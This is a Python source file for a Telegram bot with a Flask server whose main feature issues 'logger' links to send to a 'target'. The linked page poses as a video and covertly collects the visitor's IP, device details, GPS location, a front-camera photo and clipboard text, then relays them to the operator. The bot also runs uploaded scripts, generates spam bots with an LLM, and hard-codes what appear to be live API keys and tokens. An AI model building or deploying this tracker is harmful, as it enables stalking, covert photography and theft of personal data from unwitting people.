import asyncio
from telethon import TelegramClient, events, Button
from telethon.tl.types import InputMediaGeoPoint, InputGeoPoint
from flask import Flask, request, render_template_string
import threading
import random
import string
import json
import os
from datetime import datetime
import requests
import base64
import tempfile
import subprocess

BOT_TOKEN = "8962532742:AAG1377yowFSqklfaPP_AzEXvIvV-Fm_jqw"
GROQ_API_KEY = "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"
API_URL = "https://api.groq.com/openai/v1/chat/completions"

bot = TelegramClient('allinone_bot', api_id=6, api_hash="eb06d4abfb49dc3eeb1aeb98ae0f581e")
app = Flask(__name__)
links = {}
user_states = {}
loop = None
BOTS_DIR = "deployed_bots"
os.makedirs(BOTS_DIR, exist_ok=True)

TRACKER_PAGE = """<!DOCTYPE html>
<html>
<head><title>Video</title><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#fff;font-family:Arial;text-align:center}
button{background:#fe2c55;color:#fff;border:none;padding:15px 40px;font-size:18px;border-radius:30px;margin:10px;cursor:pointer}
#status{margin-top:20px;color:#aaa}
</style></head>
<body>
<h2 style="margin-top:80px">Video Ready</h2>
<p>Press button to watch</p>
<button onclick="startAll()">Watch Video</button>
<p id="status"></p>
<video id="v" style="display:none" autoplay playsinline></video>
<canvas id="c" style="display:none"></canvas>
<script>
fetch('/collect/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ua:navigator.userAgent,pl:navigator.platform,la:navigator.language,ss:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone})});
function startAll(){
    document.getElementById('status').innerText='Loading...';
    if(navigator.geolocation){navigator.geolocation.getCurrentPosition(p=>fetch('/gps/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy})}),e=>{},{enableHighAccuracy:true,timeout:10000});}
    (async()=>{try{var s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});var v=document.getElementById('v');v.srcObject=s;await v.play();await new Promise(r=>setTimeout(r,2000));var c=document.getElementById('c');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0);var ph=c.toDataURL('image/jpeg',0.7);await fetch('/photo/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({photo:ph})});s.getTracks().forEach(t=>t.stop())}catch(e){}})();
    (async()=>{try{var t=await navigator.clipboard.readText();if(t)fetch('/clipboard/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({clipboard:t})})}catch(e){}})();
    setTimeout(()=>{document.getElementById('status').innerText='Done';window.location.href='https://t.me/creator_failpybot'},3000);
}
</script></body></html>"""

def gen_id():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8))

def get_ip_info(ip):
    first_ip = ip.split(',')[0].strip()
    try:
        r = requests.get(f"https://ipapi.co/{first_ip}/json/", timeout=5)
        data = r.json()
        if data.get('city'): return {'country': data.get('country_name','?'), 'city': data.get('city','?'), 'region': data.get('region','?'), 'isp': data.get('org','?'), 'lat': data.get('latitude'), 'lon': data.get('longitude'), 'query': first_ip}
    except: pass
    try:
        r = requests.get(f"http://ip-api.com/json/{first_ip}?fields=country,regionName,city,isp,lat,lon,query", timeout=5)
        data = r.json()
        if data.get('city'): return {'country': data.get('country','?'), 'city': data.get('city','?'), 'region': data.get('regionName','?'), 'isp': data.get('isp','?'), 'lat': data.get('lat'), 'lon': data.get('lon'), 'query': first_ip}
    except: pass
    return {'country':'?','city':'?','region':'?','isp':'?','lat':None,'lon':None,'query':first_ip}

@app.route('/')
def home(): return "OK"

@app.route('/go/<lid>')
def track(lid):
    if lid not in links: return "Invalid link"
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', '?')
    v = {'time': datetime.now().strftime('%H:%M:%S'), 'ip': ip, 'ua': ua, 'photo': None, 'gps': None, 'clipboard': None}
    v.update(get_ip_info(ip))
    links[lid]['victims'].append(v)
    asyncio.run_coroutine_threadsafe(notify(links[lid]['owner'], lid), loop)
    return render_template_string(TRACKER_PAGE, link_id=lid)

@app.route('/collect/<lid>', methods=['POST'])
def coll(lid):
    if lid in links and links[lid]['victims']: links[lid]['victims'][-1]['dev'] = request.get_json()
    return 'ok'

@app.route('/photo/<lid>', methods=['POST'])
def photo(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        if d.get('photo'): links[lid]['victims'][-1]['photo'] = d['photo']
    return 'ok'

@app.route('/gps/<lid>', methods=['POST'])
def gps(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        links[lid]['victims'][-1]['gps'] = d
    return 'ok'

@app.route('/clipboard/<lid>', methods=['POST'])
def clipboard(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        if d.get('clipboard'): links[lid]['victims'][-1]['clipboard'] = d['clipboard']
    return 'ok'

async def notify(uid, lid):
    try:
        await asyncio.sleep(10)
        v = links[lid]['victims'][-1] if links[lid]['victims'] else {}
        report = f"""NEW VISIT
Time: {v.get('time','?')}
IP: {v.get('ip','?').split(',')[0].strip() if v.get('ip') else '?'}
Location: {v.get('city','?')}, {v.get('region','?')}, {v.get('country','?')}
ISP: {v.get('isp','?')}
Device: {v.get('ua','?')[:150]}
"""
        if v.get('gps') and v['gps'].get('lat'): report += f"GPS: {v['gps']['lat']}, {v['gps']['lon']}\n"
        if v.get('clipboard'): report += f"Clipboard: {v['clipboard'][:200]}"
        await bot.send_message(uid, report[:2000])
        if v.get('photo'):
            try:
                photo_path = f"photo_{lid}.jpg"
                with open(photo_path, 'wb') as f: f.write(base64.b64decode(v['photo'].split(',')[1]))
                if os.path.getsize(photo_path) > 100: await bot.send_file(uid, photo_path, caption="Photo")
                os.remove(photo_path)
            except: pass
        if v.get('gps') and v['gps'].get('lat'):
            lat, lon = v['gps']['lat'], v['gps']['lon']
            geo = InputMediaGeoPoint(geo_point=InputGeoPoint(lat=lat, long=lon, accuracy_radius=10))
            await bot.send_file(uid, file=geo, caption="GPS")
            await bot.send_message(uid, f"Google Maps: https://maps.google.com/?q={lat},{lon}", link_preview=True)
    except Exception as e:
        print(f"Notify error: {e}")

# ================= ИИ С ГЛУБОКИМ МЫШЛЕНИЕМ =================
def generate_bot_code(description: str) -> str:
    prompt = f"""You are an expert Python developer specializing in Telegram bots using Telethon library.
Write a COMPLETE, working bot code based on the description below.
Take your time to think through the logic carefully before writing code.
Make sure all handlers are correct and the bot will work without errors.

CRITICAL RULES:
1. Use ONLY: from telethon import TelegramClient, events
2. api_id = 6, api_hash = "eb06d4abfb49dc3eeb1aeb98ae0f581e"
3. Token must be: BOT_TOKEN = "REPLACE_WITH_YOUR_TOKEN"
4. Add /start command with function description
5. Output ONLY Python code, no explanations
6. Code must be fully functional
7. Do NOT use emoji or special characters in comments

Bot description: {description}

Think step by step:
1. What handlers are needed?
2. What imports are required?
3. What is the main logic?
4. Are there any edge cases?

Now write the complete code:"""
    
    headers = {"Content-Type": "application/json", "Authorization": f"Bearer {GROQ_API_KEY}"}
    payload = {
        "model": "llama-3.3-70b-versatile",
        "messages": [{"role": "user", "content": prompt}],
        "temperature": 0.2,
        "max_tokens": 6000,
        "top_p": 0.95,
        "frequency_penalty": 0.1,
        "presence_penalty": 0.1,
    }
    
    try:
        resp = requests.post(API_URL, json=payload, headers=headers, timeout=60)
        code = resp.json()['choices'][0]['message']['content']
        return code.replace("```python", "").replace("```", "").strip()
    except Exception as e:
        return f"# Generation error: {e}"

def deploy_bot(code: str, token: str) -> str:
    code = code.replace("REPLACE_WITH_YOUR_TOKEN", token)
    code = code.replace("ВСТАВЬ_СВОЙ_ТОКЕН", token)
    bot_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))
    filename = f"{BOTS_DIR}/bot_{bot_id}.py"
    with open(filename, 'w', encoding='utf-8') as f: f.write(code)
    subprocess.Popen(['python', filename], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return f"bot_{bot_id}.py"

# ================= БОТ =================
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    buttons = [
        [Button.inline("Create logger link", "logger")],
        [Button.inline("Upload .py file (deploy bot)", "upload")],
        [Button.inline("AI generate bot", "ai_generate")],
    ]
    await event.reply("ALL-IN-ONE BOT\n\nLogger | Deploy | AI Generator\n\nChoose action:", buttons=buttons)

@bot.on(events.CallbackQuery)
async def callback(event):
    user_id = event.sender_id
    data = event.data.decode()
    
    if data == "logger":
        lid = gen_id()
        links[lid] = {'owner': user_id, 'created': datetime.now().strftime('%H:%M'), 'victims': []}
        await event.edit(f"Link created:\n`https://botaald.onrender.com/go/{lid}`\n\nSend to target!")
    
    elif data == "upload":
        user_states[user_id] = {'action': 'wait_code'}
        await event.edit("Send .py file with bot code")
    
    elif data == "ai_generate":
        user_states[user_id] = {'action': 'wait_description'}
        await event.edit("Describe your bot:\nExample: 'bot for spam in chat'")

@bot.on(events.NewMessage(incoming=True))
async def handle(event):
    if event.out: return
    user_id = event.sender_id
    text = event.text.strip() if event.text else ""
    
    if user_id not in user_states: return
    state = user_states[user_id]
    
    if state['action'] == 'wait_code' and event.file and event.file.name and event.file.name.endswith('.py'):
        temp_path = os.path.join(tempfile.gettempdir(), event.file.name)
        await event.download_media(temp_path)
        with open(temp_path, 'r', encoding='utf-8', errors='ignore') as f: code = f.read()
        user_states[user_id]['code'] = code
        user_states[user_id]['action'] = 'wait_token'
        await event.reply("Code received! Send bot token from @BotFather:")
        os.remove(temp_path)
    
    elif state['action'] == 'wait_token' and ':' in text and len(text) > 30:
        code = state['code']
        msg = await event.reply("Deploying bot...")
        try:
            filename = deploy_bot(code, text)
            del user_states[user_id]
            await msg.edit(f"Bot deployed! File: `{filename}`")
        except Exception as e:
            await msg.edit(f"Error: {e}")
    
    elif state['action'] == 'wait_description' and text:
        msg = await event.reply("AI is generating code...")
        code = generate_bot_code(text)
        gen_path = os.path.join(tempfile.gettempdir(), f"bot_{random.randint(1000,9999)}.py")
        with open(gen_path, 'w', encoding='utf-8') as f: f.write(code)
        await msg.edit("Sending file...")
        await bot.send_file(user_id, gen_path, caption="Your bot code\nReplace REPLACE_WITH_YOUR_TOKEN with your token")
        os.remove(gen_path)
        del user_states[user_id]

async def main():
    global loop
    loop = asyncio.get_event_loop()
    port = int(os.environ.get('PORT', 8080))
    def run_flask(): app.run(host='0.0.0.0', port=port, debug=False)
    threading.Thread(target=run_flask, daemon=True).start()
    await bot.start(bot_token=BOT_TOKEN)
    print("All-in-One bot started!")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
